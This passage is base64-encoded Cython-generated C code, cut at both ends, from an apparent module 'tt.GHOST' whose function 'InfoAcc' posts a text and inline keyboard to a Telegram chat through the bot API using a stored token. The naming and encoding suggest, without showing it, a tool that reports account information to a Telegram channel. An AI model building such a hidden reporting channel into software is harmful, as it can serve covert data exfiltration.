AgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF8xOCwgMCwgX19weXhfdF8yMSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgMzQ1LCBfX3B5eF9MM19lcnJvcik7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzE4LCAxLCBfX3B5eF90XzE5KSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNDUsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fcHl4X3RfMjEgPSAwO1xuICAgICAgX19weXhfdF8xOSA9IDA7XG4gICAgICBfX3B5eF90XzE5ID0gUHlMaXN0X05ldygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDM0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzE5LCAwLCBfX3B5eF90XzE4KSAhPSAoMCkpIF9fUFlYX0VSUigwLCAzNDUsIF9fcHl4X0wzX2Vycm9yKTtcbiAgICAgIF9fcHl4X3RfMTggPSAwO1xuICAgICAgX19weXhfdl9pbmxpbmVfa2V5Ym9hcmQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzE5KTtcbiAgICAgIF9fcHl4X3RfMTkgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9pZCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGF0X2lkLCBfX3B5eF90XzE4KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0LCBfX3B5eF92X3NzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF90XzIxID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kdW1wcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMzQ4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzE3LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5saW5lX2tleWJvYXJkLCBfX3B5eF92X2lubGluZV9rZXlib2FyZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdF8zID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzE2KSkpIHtcbiAgICAgICAgX19weXhfdF8yMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTYpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF8yMSk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIxKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF8zID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yMSwgX19weXhfdF8xN307XG4gICAgICAgIF9fcHl4X3RfMTggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfMTYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTgpKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTgpO1xuICAgICAgfVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXBseV9tYXJrdXAsIF9fcHl4X3RfMTgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7XG4gICAgICBfX3B5eF92X3BheWxvYWQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzE5KTtcbiAgICAgIF9fcHl4X3RfMTkgPSAwO1xuXG4gICAgICBcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMTIsICZfX3B5eF90XzExLCAmX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzE4ID0gTlVMTDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMzUxLCBfX3B5eF9MMjVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzE2ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b2tlbik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCAzNTIsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzE2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIxKSkgX19QWVhfRVJSKDAsIDM1MiwgX19weXhfTDI1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfMjJbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FwaV90ZWxlZ3JhbV9vcmdfYm90O1xuICAgICAgICAgIF9fcHl4X3RfMjJbMV0gPSBfX3B5eF90XzIxO1xuICAgICAgICAgIF9fcHl4X3RfMjJbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3NlbmRNZXNzYWdlO1xuICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzIyLCAzLCAyOCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMjEpICsgMTIsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzIxKSk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM1MiwgX19weXhfTDI1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfMyA9IDE7XG4gICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzE3KSkpIHtcbiAgICAgICAgICAgIF9fcHl4X3RfMTggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzE3KTtcbiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzE4KTtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNyk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xOCk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xNywgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfMTgsIF9fcHl4X3RfMTZ9O1xuICAgICAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIxKTtcbiAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfcGF5bG9hZCwgX19weXhfdF8yMSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWVvdXQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgX19weXhfdF8yMSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wyNV9lcnJvcilcbiAgICAgICAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoKFB5T2JqZWN0KilfX3B5eF90XzE3LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMjEpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMzUxLCBfX3B5eF9MMjVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBnb3RvIF9fcHl4X0wzMF90cnlfZW5kO1xuICAgICAgICBfX3B5eF9MMjVfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzIzID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgICAgICBpZiAoX19weXhfdF8yMykge1xuICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTksICZfX3B5eF90XzE3LCAmX19weXhfdF8yMSkgPCAwKSBfX1BZWF9FUlIoMCwgMzUzLCBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjEpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzE3O1xuICAgICAgICAgICB7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgX19weXhfdF8xOCA9IE5VTEw7XG4gICAgICAgICAgICBfX3B5eF90XzMgPSAxO1xuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99O1xuICAgICAgICAgICAgICBfX3B5eF90XzE2ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF9idWlsdGluX3ByaW50LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDM1NCwgX19weXhfTDM2X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgIH1cblxuICAgICAgICAgIFxuICAgICAgICAgICB7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wzNztcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0wzNl9lcnJvcjo7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgICAgICBfX3B5eF90XzI2ID0gMDsgX19weXhfdF8yNyA9IDA7IF9fcHl4X3RfMjggPSAwOyBfX3B5eF90XzI5ID0gMDsgX19weXhfdF8zMCA9IDA7IF9fcHl4X3RfMzEgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8yOSwgJl9fcHl4X3RfMzAsICZfX3B5eF90XzMxKTtcbiAgICAgICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMjYsICZfX3B5eF90XzI3LCAmX19weXhfdF8yOCkgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMjYsICZfX3B5eF90XzI3LCAmX19weXhfdF8yOCk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNik7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNyk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yOCk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yOSk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zMCk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zMSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMjMgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMjQgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzI1ID0gX19weXhfZmlsZW5hbWU7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI5KTtcbiAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zMCk7XG4gICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzEpO1xuICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzI5LCBfX3B5eF90XzMwLCBfX3B5eF90XzMxKTtcbiAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yNik7XG4gICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjcpO1xuICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI4KTtcbiAgICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzI2LCBfX3B5eF90XzI3LCBfX3B5eF90XzI4KTtcbiAgICAgICAgICAgICAgX19weXhfdF8yNiA9IDA7IF9fcHl4X3RfMjcgPSAwOyBfX3B5eF90XzI4ID0gMDsgX19weXhfdF8yOSA9IDA7IF9fcHl4X3RfMzAgPSAwOyBfX3B5eF90XzMxID0gMDtcbiAgICAgICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8yMzsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMjQ7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8yNTtcbiAgICAgICAgICAgICAgZ290byBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19weXhfTDM3OjtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MMjZfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF9MMjdfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMik7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xMiwgX19weXhfdF8xMSwgX19weXhfdF8xMCk7XG4gICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wyNl9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzExKTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTIsIF9fcHl4X3RfMTEsIF9fcHl4X3RfMTApO1xuICAgICAgICBfX3B5eF9MMzBfdHJ5X2VuZDo7XG4gICAgICB9XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICBfX